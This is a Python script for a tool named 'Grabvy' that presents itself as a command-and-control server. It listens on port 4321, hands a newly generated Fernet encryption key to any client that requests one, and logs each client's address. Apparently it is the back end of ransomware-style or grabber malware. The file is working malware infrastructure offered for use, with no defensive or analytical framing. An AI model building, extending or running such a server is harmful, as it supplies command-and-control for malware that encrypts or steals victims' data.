# Modules
from cryptography.fernet import Fernet
from colorama import *
import socket, os, threading
from time import sleep

os.system("cls")
threadsClients = []



# Function ptime
def ptime(text, time):
    for char in text:
        print(char, end="", flush=True)
        sleep(time)


# Function println
def println():
    print("\n")



# Print banner
banner_text = '''
* * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
*            _____           _                          *
*           / ____|         | |                         *
*          | |  __ _ __ __ _| |____   ___   _           *
*          | | |_ | '__/ _` | '_ \ \ / / | | |          *
*          | |__| | | | (_| | |_) \ V /| |_| |          *
*           \_____|_|  \__,_|_.__/ \_/  \__, |          *
*                                        __/ |          *
*                                       |___/           *
*    _______________________________________________    *
*   | Grabvy 1.3.6  (Build #256)                    |   *
*   | Coded by Rognon Matthieu                      |   *
*   | grabmytx@protonmail.com                       |   *
*   |_______________________________________________|   *
*                                                       *
* * * * * * * * * * * * * * * * * * * * * * * * * * * * *
'''
print(Fore.GREEN + banner_text)


# Print Starting server...
text1 = "Starting C2 server : "
for char in text1:
        print(char, end="", flush=True)
        sleep(0.05)

# Print loading bar...
text2 = "[##################################]"
sleep(0.3)
for char in text2:
        print(char, end="", flush=True)
        sleep(0.06)

# Println
println()
sleep(0.3)


# Multithreading client
def instanceServeur(client, ipconfig):
    IP = ipconfig[0]
    port = str(ipconfig[1])
    message = "Error, no text !"

    ptime("New connected client : " + IP + ":" + port, 0.05)
    println()

    message = client.recv(255).decode("utf-8")

    if message == "key":
        key = Fernet.generate_key()
        text_key = str(key).split("'")
        ptime("     Create new encryption key = " + text_key[1], 0.05)
        println()
        
        ptime("     Encryption key send to " + str(ipconfig[0]) + ":" + str(ipconfig[1]), 0.05)
        println()

        client.send(key)

        client.close()
        ptime("     Connexion fermée avec " + str(ipconfig[0]) + ":" + str(ipconfig[1]), 0.05)
        println()
        


# Create socket server
serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serveur.bind(('', 4321))
serveur.listen(5)


# Infinity boucle for lauch instance client
while True:
    client, ipconfig = serveur.accept()
    threadsClients.append(threading.Thread(
        None, instanceServeur, None, (client, ipconfig), {}))
    threadsClients[-1].start()
serveur.close()